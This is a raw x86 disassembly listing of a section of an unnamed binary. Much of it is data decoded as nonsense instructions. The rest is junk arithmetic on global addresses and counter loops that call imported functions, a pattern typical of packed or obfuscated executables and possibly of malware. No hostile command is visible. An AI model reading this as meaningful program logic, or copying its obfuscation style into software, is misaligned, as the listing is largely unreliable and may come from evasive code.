  40484b:	fisttp QWORD PTR [esi+0x7f652044]
  404851:	pop    DWORD PTR ds:[edx]
  404854:	shl    DWORD PTR [esi-0x22baacfd],cl
  40485a:	mov    BYTE PTR [ecx],0xdb
  40485d:	pop    esp
  40485e:	rcl    DWORD PTR [ecx],1
  404860:	jns    0x404800
  404862:	mov    dh,0x43
  404864:	daa    
  404865:	add    eax,0x12216723
  40486a:	fstp   TBYTE PTR [esi]
  40486c:	dec    edi
  40486d:	loopne 0x40483b
  40486f:	xchg   esp,eax
  404870:	or     esp,DWORD PTR [eax+0x5a8ff6a1]
  404876:	dec    ecx
  404877:	repz jns 0x40487a
  40487a:	mov    ebx,0x75c1bb44
  40487f:	mov    ah,BYTE PTR [ecx+0x73]
  404882:	aaa    
  404883:	adc    bh,BYTE PTR [ebx-0x27646508]
  404889:	or     bh,BYTE PTR [ebp-0x68]
  40488c:	jp     0x404838
  40488e:	jns    0x4048ca
  404890:	fsubp  st(1),st
  404892:	(bad)  
  404893:	and    ah,BYTE PTR [esi]
  404895:	fadd   QWORD PTR [esi+0x72]
  404898:	and    dl,BYTE PTR [ebp-0x6e7b949a]
  40489e:	outs   dx,BYTE PTR ds:[esi]
  40489f:	out    0x14,al
  4048a1:	mov    esp,0xaf44d197
  4048a6:	xor    edi,ecx
  4048a8:	popa   
  4048a9:	cmc    
  4048aa:	jne    0x404857
  4048ac:	pushf  
  4048ad:	pop    esp
  4048ae:	inc    esp
  4048af:	and    ebx,DWORD PTR [ebp+0x1c190b64]
  4048b5:	test   eax,0xcaed68
  4048ba:	ret    
  4048bb:	jge    0x40485f
  4048bd:	loopne 0x404907
  4048bf:	xor    al,BYTE PTR [ebp-0x66]
  4048c2:	mov    dh,0x3b
  4048c4:	xchg   bl,dh
  4048c6:	cli    
  4048c7:	ins    BYTE PTR es:[edi],dx
  4048c8:	pop    eax
  4048c9:	les    edx,FWORD PTR [ebx-0x6de2eb34]
  4048cf:	data16 fiadd DWORD PTR ds:0x8618feed
  4048d6:	jmp    0x4048e7
  4048d8:	(bad)  [esi+esi*8+0x36]
  4048dc:	ds call 0x578c995f
  4048e2:	add    eax,0xe59118ff
  4048e7:	repz dec esp
  4048e9:	lods   eax,DWORD PTR ds:[esi]
  4048ea:	pop    edi
  4048eb:	jp     0x404920
  4048ed:	and    al,dl
  4048ef:	mov    DWORD PTR [edx-0x24],esi
  4048f2:	sahf   
  4048f3:	icebp  
  4048f4:	popa   
  4048f5:	push   edi
  4048f6:	enter  0x9fce,0x6c
  4048fa:	add    al,0x1e
  4048fc:	shl    DWORD PTR [eax],0xef
  4048ff:	(bad)  
  404900:	and    al,ah
  404902:	dec    ebp
  404903:	leave  
  404904:	lea    esi,[edx-0x1b]
  404907:	in     al,0x5f
  404909:	adc    BYTE PTR [ebp+ebx*8+0x1a],bl
  40490d:	ror    ebx,0x47
  404910:	fmul   QWORD PTR [eax+0x1a237436]
  404916:	jp     0x404915
  404918:	push   ss
  404919:	inc    esi
  40491a:	and    eax,0xa9c99473
  40491f:	pop    es
  404920:	fimul  DWORD PTR [ecx-0x5e]
  404923:	in     al,dx
  404924:	mov    DWORD PTR [ebp-0x24],0xf89c85d8
  40492b:	mov    eax,DWORD PTR [ebp-0xc]
  40492e:	sbb    DWORD PTR ds:0x417e59,0x417e51
  404938:	xor    eax,esi
  40493a:	sub    DWORD PTR ds:0x41abde,0x4245ba
  404944:	jmp    0x404abd
  404949:	fst    QWORD PTR [ebx]
  40494b:	cdq    
  40494c:	loope  0x4049a7
  40494e:	jns    0x4049a5
  404950:	and    eax,esi
  404952:	scas   al,BYTE PTR es:[edi]
  404953:	pop    ss
  404954:	rcl    DWORD PTR [si-0x1bb2],1
  404959:	fidivr DWORD PTR [edi+0x7e]
  40495c:	jle    0x404938
  40495e:	jg     0x4049de
  404960:	jle    0x40494f
  404962:	imul   ebx,DWORD PTR [esi],0x599c41be
  404968:	pop    ss
  404969:	pushf  
  40496a:	cmp    esi,edx
  40496c:	and    dl,BYTE PTR [eax-0x74]
  40496f:	or     DWORD PTR [esi+0x6746b91e],edx
  404975:	test   ecx,esp
  404977:	hlt    
  404978:	pop    edx
  404979:	or     al,0x32
  40497b:	call   0x4785cc92
  404980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404981:	in     al,dx
  404982:	gs hlt 
  404984:	icebp  
  404985:	lock xor DWORD PTR [eax+0x37],esi
  404989:	sahf   
  40498a:	mov    dh,0xc3
  40498c:	lea    esi,[esi+0x2e3550d9]
  404992:	bound  edi,QWORD PTR [edx-0x3d]
  404995:	test   bl,ah
  404997:	mov    al,ds:0x2bea4cc9
  40499c:	imul   esi,DWORD PTR [ecx+0x68],0xe356ba97
  4049a3:	mov    ecx,0xa262c5b8
  4049a8:	push   ds
  4049a9:	and    ah,BYTE PTR [esi+0x40dd27f2]
  4049af:	xor    edx,ecx
  4049b1:	dec    esi
  4049b2:	mov    edi,0x7b7d3b5
  4049b7:	lock mov edx,0x11365277
  4049bd:	gs (bad) 
  4049bf:	outs   dx,BYTE PTR ds:[esi]
  4049c0:	adc    edi,DWORD PTR ds:0xbfba1c88
  4049c6:	test   BYTE PTR [edx],dl
  4049c8:	pop    esp
  4049c9:	dec    edi
  4049ca:	inc    edx
  4049cb:	aad    0x4
  4049cd:	cmp    ebx,DWORD PTR ds:0xc8be9756
  4049d3:	rcl    DWORD PTR [ebx+0x55512b9c],1
  4049d9:	mov    ch,0x69
  4049db:	cmp    edi,DWORD PTR [eax+0x24]
  4049de:	in     al,0xda
  4049e0:	push   eax
  4049e1:	mov    ebp,0x362e50d9
  4049e6:	adc    BYTE PTR [ebp+0x2a],dl
  4049e9:	pusha  
  4049ea:	jmp    0x778a:0x27da16c1
  4049f1:	dec    ebp
  4049f2:	sub    bh,cl
  4049f4:	or     DWORD PTR [ebx+ebp*1-0x64],eax
  4049f8:	loope  0x4049d8
  4049fa:	in     al,dx
  4049fb:	dec    eax
  4049fc:	mov    edx,0xa85822d7
  404a01:	or     esi,ebx
  404a03:	jp     0x404a0e
  404a05:	adc    eax,0x2758ef06
  404a0a:	add    ebx,DWORD PTR [ebx]
  404a0c:	adc    bh,cl
  404a0e:	jbe    0x404a59
  404a10:	les    ebp,FWORD PTR cs:[edi-0x13]
  404a14:	sbb    BYTE PTR [ebx+0x9b11fa2],bh
  404a1a:	sbb    al,0x24
  404a1c:	xchg   esp,eax
  404a1d:	jae    0x404a03
  404a1f:	xchg   esi,eax
  404a20:	push   edx
  404a21:	std    
  404a22:	mov    al,ds:0xe52afe31
  404a27:	sub    al,0xbd
  404a29:	mov    ds:0x21646576,eax
  404a2e:	fnstcw WORD PTR [edi-0x3d]
  404a31:	jmp    0xaaa12057
  404a36:	clc    
  404a37:	adc    DWORD PTR [ecx-0x18],ebp
  404a3a:	fiadd  WORD PTR [eax]
  404a3c:	sub    al,0xd3
  404a3e:	sub    BYTE PTR [edx],cl
  404a40:	fwait
  404a41:	pop    es
  404a42:	hlt    
  404a43:	aam    0xb9
  404a45:	lods   eax,DWORD PTR ds:[esi]
  404a46:	out    0xf5,eax
  404a48:	outs   dx,DWORD PTR ds:[esi]
  404a49:	mov    ebx,eax
  404a4b:	nop
  404a4c:	into   
  404a4d:	or     al,0x1a
  404a4f:	std    
  404a50:	push   esi
  404a51:	bound  eax,QWORD PTR [ecx]
  404a53:	aad    0x8a
  404a55:	sbb    DWORD PTR [ebp*1+0x1f32e093],edx
  404a5c:	inc    esp
  404a5d:	in     eax,dx
  404a5e:	mov    eax,0x4b131c79
  404a63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a64:	or     ebx,DWORD PTR [eax+0x1e]
  404a67:	inc    edx
  404a68:	sbb    al,0x67
  404a6a:	scas   al,BYTE PTR es:[edi]
  404a6b:	jne    0x404a98
  404a6d:	sub    esi,edx
  404a6f:	pusha  
  404a70:	mov    ch,0x66
  404a72:	inc    eax
  404a73:	nop
  404a74:	retf   0x41b6
  404a77:	adc    BYTE PTR [edi],dl
  404a79:	sub    dl,ch
  404a7b:	fs nop
  404a7d:	arpl   WORD PTR [eax],sp
  404a7f:	iret   
  404a80:	inc    edx
  404a81:	retf   
  404a82:	dec    ecx
  404a83:	aad    0x7c
  404a85:	push   ds
  404a86:	sbb    eax,0x35218c7c
  404a8b:	and    al,0x67
  404a8d:	lds    ecx,FWORD PTR [edi+0x8]
  404a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a91:	jl     0x404af0
  404a93:	fadd   st,st(5)
  404a95:	daa    
  404a96:	loop   0x404a63
  404a98:	inc    ecx
  404a9a:	inc    ebx
  404a9b:	xor    eax,0xe9a22ef2
  404aa0:	test   DWORD PTR [esi],edi
  404aa2:	fadd   QWORD PTR [ecx+0x68]
  404aa5:	cmp    BYTE PTR [eax+0x6c2727d9],al
  404aab:	lock stos DWORD PTR es:[edi],eax
  404aad:	fist   DWORD PTR [ebx]
  404aaf:	jmp    0x41b1:0x17657458
  404ab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ab7:	shl    DWORD PTR [ebx],1
  404ab9:	repz dec edi
  404abb:	lea    ebx,[eax+0x3]
  404abe:	(bad)  
  404abf:	mov    DWORD PTR [ebp-0x18],eax
  404ac2:	and    DWORD PTR ds:0x4245ba,0x0
  404acc:	jmp    0x404adc
  404ad1:	mov    eax,ds:0x4245ba
  404ad6:	inc    eax
  404ad7:	mov    ds:0x4245ba,eax
  404adc:	cmp    DWORD PTR ds:0x4245ba,0x1e
  404ae3:	jae    0x404b28
  404ae9:	cmp    DWORD PTR ds:0x4245ba,0x6
  404af0:	jne    0x404b01
  404af6:	push   0x41ae97
  404afb:	call   DWORD PTR ds:0x40d1c4
  404b01:	cmp    DWORD PTR ds:0x4245ba,0x5
  404b08:	jne    0x404b19
  404b0e:	mov    eax,ds:0x4245ba
  404b13:	inc    eax
  404b14:	mov    ds:0x4245ba,eax
  404b19:	jmp    0x404ad1
  404b1e:	sub    DWORD PTR ds:0x415111,0xc33
  404b28:	mov    DWORD PTR [ebp-0x1c],0xf89c853f
  404b2f:	mov    BYTE PTR [ebp-0x1],0x57
  404b33:	sub    DWORD PTR ds:0x417e59,edi
  404b39:	mov    eax,DWORD PTR [ebp-0xc]
  404b3c:	xor    eax,esi
  404b3e:	and    DWORD PTR ds:0x415115,0x5145
  404b48:	add    eax,edi
  404b4a:	mov    DWORD PTR [ebp-0x18],eax
  404b4d:	mov    eax,DWORD PTR [ebp-0x24]
  404b50:	xor    eax,esi
  404b52:	adc    DWORD PTR ds:0x41abde,0x3f71
  404b5c:	add    eax,edi
  404b5e:	and    DWORD PTR ds:0x4245be,0x352e
  404b68:	push   eax
  404b69:	dec    eax
  404b6a:	mov    eax,DWORD PTR [ebp-0x28]
  404b6d:	xor    eax,esi
  404b6f:	and    DWORD PTR ds:0x4245b2,0x41abce
  404b79:	add    eax,edi
  404b7b:	xor    DWORD PTR ds:0x41abda,0x41237c
  404b85:	push   eax
  404b86:	and    DWORD PTR ds:0x4245be,0x41abe2
  404b90:	mov    eax,DWORD PTR [ebp-0x1c]
  404b93:	jmp    0x404d0c
  404b98:	push   0xffffff9c
  404b9a:	mov    ds:0x7b617853,al
  404b9f:	xchg   ebp,eax
  404ba0:	push   ebx
  404ba1:	mov    DWORD PTR [ecx+0x3f],esp
  404ba4:	lods   al,BYTE PTR ds:[esi]
  404ba5:	or     ah,ah
  404ba7:	pop    ecx
  404ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ba9:	jl     0x404c29
  404bab:	jle    0x404b87
  404bad:	jg     0x404c2d
  404baf:	jle    0x404bae
  404bb1:	jmp    0xf70a9b1a
  404bb6:	aam    0x4d
  404bb8:	or     BYTE PTR [edx],ch
  404bba:	pop    eax
  404bbb:	test   DWORD PTR [ebp+eiz*2+0x1c183fc4],ebx
  404bc2:	dec    eax
  404bc3:	jne    0x404c09
  404bc5:	das    
  404bc6:	mov    bl,ah
  404bc8:	mov    esi,0xbc99d2d3
  404bcd:	jge    0x404c1c
  404bcf:	cmp    al,ah
  404bd1:	lock push esp
  404bd3:	mov    esi,0xec2fb423
  404bd8:	mov    BYTE PTR [edi],bh
  404bda:	xchg   ebp,eax
  404bdb:	mov    sp,0xd476
  404bdf:	mov    ds:0x39096458,eax
  404be4:	xchg   ebp,eax
  404be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404be6:	in     al,dx
  404be7:	pop    edi
  404be8:	or     BYTE PTR [eax],ah
  404bea:	popf   
  404beb:	mov    ah,0xe3
  404bed:	mov    ebp,eax
  404bef:	es (bad) 
  404bf1:	pop    eax
  404bf2:	sub    edx,0x84b0cdf0
  404bf8:	arpl   sp,bp
  404bfa:	push   ebp
  404bfb:	jle    0x404c04
  404bfd:	push   eax
  404bfe:	jp     0x404bd3
  404c00:	lods   eax,DWORD PTR ds:[esi]
  404c01:	dec    esp
  404c02:	in     eax,0xae
  404c04:	xchg   ebp,eax
  404c05:	sbb    eax,0xec7f05e1
  404c0a:	out    0x7f,al
  404c0c:	or     esi,edx
  404c0e:	dec    esi
  404c0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c10:	xchg   esp,eax
  404c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c12:	fstp   QWORD PTR [ecx]
  404c14:	arpl   WORD PTR [edx],ax
  404c16:	mov    bl,0x21
  404c18:	jo     0x404b9d
  404c1a:	pop    esi
  404c1b:	popf   
  404c1c:	ja     0x404c4a
  404c1e:	daa    
  404c1f:	push   es
  404c20:	jle    0x404ba8
  404c22:	and    al,0x87
  404c24:	cs mov ch,dh
  404c27:	and    esi,DWORD PTR [ebx+0x7c]
  404c2a:	push   ebp
  404c2b:	ds cwde 
  404c2d:	or     al,0xcb
  404c2f:	mov    ds:0xa58c66e7,eax
  404c34:	sbb    al,0xfa
  404c36:	cli    
  404c37:	outs   dx,DWORD PTR ds:[esi]
  404c38:	push   ss
  404c39:	les    edi,FWORD PTR [ebp-0xf]
  404c3c:	add    ecx,DWORD PTR [ecx+ebx*1]
  404c3f:	not    DWORD PTR [esi+0x2aa38adf]
  404c45:	xchg   ebp,eax
  404c46:	mov    WORD PTR [edx],ds
  404c48:	add    al,0xe1
  404c4a:	out    0xff,al
  404c4c:	cmp    eax,0x337ce8da
  404c51:	pop    eax
  404c52:	aaa    
  404c53:	push   ss
  404c54:	and    eax,0x1b148473
  404c5a:	cmp    al,0x60
  404c5c:	mov    WORD PTR [ecx*1+0x2d322a89],ss
  404c63:	adc    eax,0xc88124a7
  404c68:	les    edi,FWORD PTR [ebx+0x1d]
  404c6b:	push   edi
  404c6c:	mov    bl,0x4c
  404c6e:	and    cl,BYTE PTR [eax-0x4daa032a]
  404c74:	jae    0x404cd2
  404c76:	loop   0x404cb5
  404c78:	inc    esi
  404c79:	ins    BYTE PTR es:[edi],dx
  404c7a:	shr    BYTE PTR [ebx],1
  404c7c:	popa   
  404c7d:	dec    ebp
  404c7e:	(bad)  
  404c7f:	enter  0x43c3,0xe2
  404c83:	push   0x8504c9a3
  404c88:	inc    edi
  404c89:	or     ecx,ebp
  404c8b:	mov    bh,0xe6
  404c8d:	lods   eax,DWORD PTR ds:[esi]
  404c8e:	inc    edx
  404c8f:	imul   eax,DWORD PTR [edx],0x66
  404c92:	add    eax,0x5fb48d69
  404c97:	mov    ss,WORD PTR [edi]
  404c99:	add    eax,0x49da55be
  404c9e:	xchg   edx,eax
  404c9f:	push   ds
  404ca0:	jb     0x404c7c
  404ca2:	mov    WORD PTR [bp+di-0x7a],?
  404ca6:	test   DWORD PTR [ebp+0x73],0xe2165367
  404cad:	jnp    0x404c97
  404caf:	push   0xb7214fea
  404cb4:	pop    edx
  404cb5:	jo     0x404c9f
  404cb7:	xor    bh,BYTE PTR [eax-0x56]
  404cba:	mov    al,0xd5
  404cbc:	lods   al,BYTE PTR ds:[esi]
  404cbd:	mov    dl,0xd6
  404cbf:	or     DWORD PTR [edx],esi
  404cc1:	or     esi,ebx
  404cc3:	pop    edi
  404cc4:	xchg   esp,esi
  404cc6:	push   ecx
  404cc7:	div    ebp
  404cc9:	fcomp  QWORD PTR [ebx+0x15a904cd]
  404ccf:	ret    0xc2a7
  404cd2:	aam    0x35
  404cd4:	adc    al,0x70
  404cd6:	fldcw  WORD PTR [edx+0x68]
  404cd9:	stos   BYTE PTR es:[edi],al
  404cda:	sbb    BYTE PTR [eax-0x3301900e],bl
  404ce0:	adc    bl,BYTE PTR [edx+0x430f5b45]
  404ce6:	ss jg  0x404cc0
  404ce9:	or     al,0x6f
  404ceb:	adc    al,0x2a
  404ced:	cwde   
  404cee:	xchg   ebp,eax
  404cef:	jmp    0x86d1e32a
  404cf4:	mov    esp,0x2c9e0d55
  404cf9:	adc    esp,DWORD PTR [ebp+0x31]
  404cfc:	mov    bl,0x40
  404cfe:	mul    BYTE PTR [edx+0x1464625c]
  404d04:	add    eax,0xe4964747
  404d09:	pop    ecx
  404d0a:	add    BYTE PTR [eax+0x1df7c633],bl
  404d10:	add    eax,0x3004151
  404d15:	mov    DWORD PTR [ecx+0x41236435],0x39b100
  404d1f:	add    BYTE PTR [eax-0x73],dl
  404d22:	inc    ebp
  404d23:	mov    BYTE PTR [eax-0x39],dl
  404d26:	add    eax,0x41237c
  404d2b:	push   edx
  404d2c:	add    BYTE PTR [bx+si],al
  404d2f:	push   DWORD PTR [ebp-0xc]
  404d32:	sub    DWORD PTR ds:0x415111,0x1b2b
  404d3c:	push   DWORD PTR [ebp-0x14]
  404d3f:	sub    DWORD PTR ds:0x4245b6,0x412364
  404d49:	call   0x409363
  404d4e:	inc    DWORD PTR ds:0x415119
  404d54:	test   eax,eax
  404d56:	mov    DWORD PTR ds:0x4245b6,0x71ec
  404d60:	je     0x404de0
  404d66:	sub    DWORD PTR ds:0x417e59,0x4245ca
  404d70:	lea    eax,[ebp-0x78]
  404d73:	neg    DWORD PTR ds:0x4245be
  404d79:	push   eax
  404d7a:	add    eax,DWORD PTR ds:0x4245ca
  404d80:	mov    eax,DWORD PTR [ebp-0x14]
  404d83:	and    DWORD PTR ds:0x417e59,0xd95
  404d8d:	xor    eax,esi
  404d8f:	add    eax,edi
  404d91:	and    DWORD PTR ds:0x417e3d,0x71b6
  404d9b:	push   eax
  404d9c:	mov    eax,DWORD PTR [ebp-0x10]
  404d9f:	add    eax,0xaa
  404da4:	push   eax
  404da5:	and    DWORD PTR ds:0x41abd2,0x17f4
  404daf:	mov    eax,DWORD PTR [ebp-0x10]
  404db2:	sub    DWORD PTR ds:0x417e55,0x41236c
  404dbc:	mov    eax,DWORD PTR [eax+0x198]
  404dc2:	push   DWORD PTR [eax]
  404dc4:	add    DWORD PTR ds:0x417e55,0x417e3d
  404dce:	call   0x40ae4d
  404dd3:	mov    DWORD PTR ds:0x41abd6,0x35a
  404ddd:	mov    DWORD PTR [ebp-0x8],eax
  404de0:	mov    DWORD PTR ds:0x412368,0x764e
  404dea:	cmp    DWORD PTR [ebp-0x8],0x0
  404dee:	not    DWORD PTR ds:0x412364
  404df4:	lea    eax,[ebp+0x4]
  404df7:	mov    DWORD PTR [ebp-0x20],eax
  404dfa:	je     0x405842
  404e00:	lea    eax,[ebp-0x18]
  404e03:	jmp    0x404f7c
  404e08:	ja     0x404d8f
  404e0a:	(bad)  
  404e0b:	je     0x404d9a
  404e0d:	je     0x404d94
  404e0f:	test   DWORD PTR [esi],edi
  404e11:	push   ebx
  404e12:	outs   dx,DWORD PTR ds:[esi]
  404e13:	jne    0x404e66
  404e15:	gs jl  0x404e0b
  404e18:	add    dh,BYTE PTR [edx+0x7e]
  404e1b:	jle    0x404df7
  404e1d:	jg     0x404e9d
  404e1f:	jle    0x404e6b
  404e21:	test   eax,0xcab3f872
  404e26:	loope  0x404dac
  404e28:	ins    DWORD PTR es:[edi],dx
  404e29:	dec    eax
  404e2a:	jg     0x404e68
  404e2c:	mov    ecx,0xb6389e72
  404e31:	in     eax,dx
  404e32:	push   0x654c1da0
  404e37:	adc    al,0x8f
  404e39:	mov    ah,0x59
  404e3b:	data16 jge 0x404e94
  404e3e:	sbb    BYTE PTR [ebx-0x11f7cb6a],al
  404e44:	pop    ss
  404e45:	push   ds
  404e46:	ds js  0x404e75
  404e49:	jmp    0x404ddb
  404e4b:	aas    
  404e4c:	jle    0x404eb9
  404e4e:	mov    esi,0x16f11236
  404e53:	push   ss
  404e54:	push   ecx
  404e55:	rol    DWORD PTR [edi-0x4],cl
  404e58:	mov    bh,BYTE PTR [edx-0x3623bb5d]
  404e5e:	sahf   
  404e5f:	xchg   edx,eax
  404e60:	mov    ebp,edi
  404e62:	push   0x3e41950b
  404e67:	mov    ah,0x69
  404e69:	(bad)  
  404e6a:	(bad)  
  404e6b:	sub    al,0x29
  404e6d:	and    BYTE PTR [eax-0x21124119],ch
  404e73:	mov    DWORD PTR [edi+0x63],ebx
  404e76:	mov    eax,cs
  404e78:	mov    ecx,0x835320a1
  404e7d:	repz pop ebp
  404e7f:	add    edx,DWORD PTR [ecx+0x49]
  404e82:	cmp    esp,DWORD PTR [esi-0x6f3943f6]
  404e88:	sbb    eax,0x4fddc95e
  404e8d:	adc    bl,0xe6
  404e90:	and    eax,0xe8c41ccf
  404e95:	push   ss
  404e96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e97:	or     al,0xcc
  404e99:	shl    BYTE PTR [edi],1
  404e9b:	add    DWORD PTR [ebx+edx*2+0x36],0xb9719252
  404ea3:	lods   eax,DWORD PTR ds:[esi]
  404ea4:	ss adc al,0x44
  404ea7:	cmp    al,0xf8
  404ea9:	jg     0x404e9f
  404eab:	cmp    DWORD PTR [eax],edx
  404ead:	mov    dh,0x9f
  404eaf:	daa    
  404eb0:	pusha  
  404eb1:	jno    0x404ed7
  404eb3:	repz cmc 
  404eb5:	inc    ebx
  404eb6:	in     al,dx
  404eb7:	ror    BYTE PTR [esi-0x72],cl
  404eba:	sbb    eax,0x1f3cbe36
  404ebf:	cli    
  404ec0:	sbb    bl,bl
  404ec2:	(bad)  
  404ec3:	ins    BYTE PTR es:[edi],dx
  404ec4:	lods   al,BYTE PTR ds:[esi]
  404ec5:	dec    edx
  404ec6:	loopne 0x404e9e
  404ec8:	mov    esp,0x1ccdc235
  404ecd:	or     al,0x85
  404ecf:	jo     0x404f11
  404ed1:	or     dh,BYTE PTR [esp+ecx*4+0x6178041a]
  404ed8:	enter  0xb1d1,0xca
  404edc:	and    eax,0xcde74ca8
  404ee1:	fcomp  DWORD PTR [edi-0x8]
  404ee4:	es cwde 
  404ee6:	inc    edi
  404ee7:	mov    ch,0xba
  404ee9:	push   ebx
  404eea:	aad    0x17
  404eec:	out    dx,eax
  404eed:	xor    BYTE PTR ds:0xd4e19ea4,ch
  404ef3:	test   al,0x4c
  404ef5:	(bad)  
  404ef7:	jae    0x404e79
  404ef9:	mov    bl,0xb5
  404efb:	(bad)  
  404efc:	jmp    0x404ea6
  404efe:	adc    ebx,ebx
  404f00:	js     0x404e83
  404f02:	push   ss
  404f03:	pop    ss
  404f04:	js     0x404ed4
  404f06:	or     dl,dl
  404f08:	add    eax,0x15000cf6
  404f0d:	or     edi,ecx
  404f0f:	retf   0x58d3
  404f12:	retf   0x12bb
  404f15:	aam    0x4d
  404f17:	mov    ah,0x1
  404f19:	jle    0x404f24
  404f1b:	xchg   esp,eax
  404f1c:	shl    DWORD PTR [esi-0x2c3269d],1
  404f22:	popf   
  404f23:	pop    es
  404f24:	ds xchg ecx,eax
  404f26:	adc    edi,eax
  404f28:	add    eax,esp
  404f2a:	adc    BYTE PTR [eax-0x33],cl
  404f2d:	ins    BYTE PTR es:[edi],dx
  404f2e:	sbb    ch,BYTE PTR [esi]
  404f30:	mov    eax,ds:0xb79ad0fa
  404f35:	mov    ebp,0x2c2a4ec3
  404f3a:	sub    DWORD PTR [ebp-0x44],ecx
  404f3d:	shl    DWORD PTR [ebp+0x70],1
  404f40:	fst    DWORD PTR [ebx]
  404f42:	ss fwait
  404f44:	dec    edx
  404f45:	jcxz   0x404f8a
  404f48:	mov    BYTE PTR [edi],dl
  404f4a:	pusha  
  404f4b:	hlt    
  404f4c:	je     0x404f8b
  404f4e:	xor    bl,dl
  404f50:	push   edx
  404f51:	pop    es
  404f52:	call   0xd54e:0xe583adcf
  404f59:	sub    eax,0x8c6262df
  404f5e:	cs or  dl,0x70
  404f62:	(bad)  
  404f64:	adc    cl,BYTE PTR [ebx+ebx*2+0x15f68b58]
  404f6b:	cs (bad) 
  404f6d:	fadd   QWORD PTR fs:[edx]
  404f70:	inc    esi
  404f71:	sbb    BYTE PTR [ebx+edx*1-0x2],al
  404f75:	out    0xd2,eax
  404f77:	repz (bad) ds:[eax+0x258150fa]
  404f7f:	scas   al,BYTE PTR es:[edi]
  404f80:	inc    ebp
  404f81:	inc    edx
  404f82:	add    BYTE PTR [eax],al
  404f84:	add    BYTE PTR [eax],al
  404f86:	add    cl,ch
  404f88:	or     eax,DWORD PTR [eax]
  404f8a:	add    BYTE PTR [eax],al
  404f8c:	mov    eax,ds:0x4245ae
  404f91:	inc    eax
  404f92:	mov    ds:0x4245ae,eax
  404f97:	cmp    DWORD PTR ds:0x4245ae,0x1e
  404f9e:	jae    0x404fc0
  404fa4:	cmp    DWORD PTR ds:0x4245ae,0x22
  404fab:	jne    0x404fba
  404fb1:	push   DWORD PTR [ebp-0x28]
  404fb4:	call   DWORD PTR ds:0x40d298
  404fba:	jmp    0x404f8c
  404fbf:	inc    eax
  404fc0:	mov    eax,DWORD PTR [ebp-0x2c]
  404fc3:	adc    DWORD PTR ds:0x412354,0x412370
  404fcd:	xor    eax,esi
  404fcf:	add    eax,edi
  404fd1:	and    DWORD PTR ds:0x415115,0x3c83
  404fdb:	jmp    0x405154
  404fe0:	adc    al,0x10
  404fe2:	imul   DWORD PTR [edx]
  404fe4:	mov    ebp,DWORD PTR [ecx+0x1f8510a9]
  404fea:	and    DWORD PTR [edx+0x2aba952],esi
  404ff0:	out    dx,al
  404ff1:	jae    0x405071
  404ff3:	jle    0x404fcf
  404ff5:	jg     0x405075
  404ff7:	jle    0x40502e
  404ff9:	mov    edx,0x476dae06
  404ffe:	add    BYTE PTR [edi-0x55],ch
  405001:	bound  eax,QWORD PTR [ecx+0x27eccb84]
  405007:	sbb    DWORD PTR [edx],edi
  405009:	mov    ss,WORD PTR [ebx+0x31]
  40500c:	enter  0xd175,0x5c
  405010:	popf   
  405011:	adc    dl,BYTE PTR [esi-0x57]
  405014:	pop    ebp
  405015:	inc    eax
  405016:	pop    ebx
  405017:	push   0x5c5eecbe
  40501c:	popa   
  40501d:	lods   eax,DWORD PTR ds:[esi]
  40501e:	mov    eax,0xbe703352
  405023:	loope  0x40506f
  405025:	les    esi,FWORD PTR [ecx+eax*1]
  405028:	jle    0x405090
  40502a:	inc    edx
  40502b:	and    eax,0xafd9cabf
  405030:	sbb    ch,dl
  405032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405033:	add    DWORD PTR [esi-0x67b1e144],ebp
  405039:	iret   
  40503a:	imul   esp,esp,0x8
  40503d:	imul   esi,DWORD PTR [ecx],0x8e6616ae
  405043:	out    dx,al
  405044:	fwait
  405045:	js     0x404fe6
  405047:	(bad)
  40504a:	add    ah,dl
  40504c:	cmp    BYTE PTR [ebx],cl
  40504e:	push   esp
  40504f:	stc    
  405050:	adc    al,BYTE PTR [edi]
  405052:	inc    ebx
  405053:	icebp  
  405054:	sub    BYTE PTR [edx-0x337f2fd5],al
  40505a:	xor    al,0x60
  40505c:	sub    edx,DWORD PTR [edi-0x5202c618]
  405062:	cwde   
  405063:	jl     0x404ff0
  405065:	dec    eax
  405066:	call   0x521a244e
  40506b:	scas   al,BYTE PTR es:[edi]
  40506c:	test   BYTE PTR [edi],ch
  40506e:	aaa    
  40506f:	cmp    eax,0xc0596e39
  405074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405075:	push   edx
  405076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405077:	pop    edx
  405078:	or     bl,BYTE PTR [edi-0x3883e887]
  40507e:	jmp    0x40505f
  405080:	pop    eax
  405081:	and    ebx,DWORD PTR [ebx+0x51]
  405084:	sub    BYTE PTR [ebx],bl
  405086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405087:	mov    bh,0x48
  405089:	and    al,cl
  40508b:	add    DWORD PTR [edx],eax
  40508d:	pusha  
  40508e:	and    al,0x65
  405090:	pop    es
  405091:	mov    esp,DWORD PTR [eax+edi*2-0x18]
  405095:	pop    ds
  405096:	imul   eax,DWORD PTR [ebx],0xe01fb979
  40509c:	cmp    BYTE PTR ds:0x3d355f30,dl
  4050a2:	aas    
  4050a3:	add    BYTE PTR [ecx+0x1b],cl
  4050a6:	jl     0x4050b2
  4050a8:	test   al,0xe8
  4050aa:	aaa    
  4050ab:	shl    BYTE PTR [ecx+0xe915bf2],1
  4050b1:	imul   edx,ecx,0xfba0f783
  4050b7:	dec    eax
  4050b8:	cli    
  4050b9:	inc    edx
  4050ba:	sbb    dh,BYTE PTR [esi-0x3cd5f8e9]
  4050c0:	dec    eax
  4050c1:	mov    ah,0x52
  4050c3:	jp     0x405083
  4050c5:	inc    ecx
  4050c6:	int3   
  4050c7:	jo     0x405057
  4050c9:	rol    DWORD PTR [edx+0x46],0xb
  4050cd:	push   esi
  4050ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050cf:	outs   dx,BYTE PTR ds:[esi]
  4050d0:	adc    edi,DWORD PTR [ecx-0x5c]
  4050d3:	mov    al,ds:0xa2eadce3
  4050d8:	xchg   esi,eax
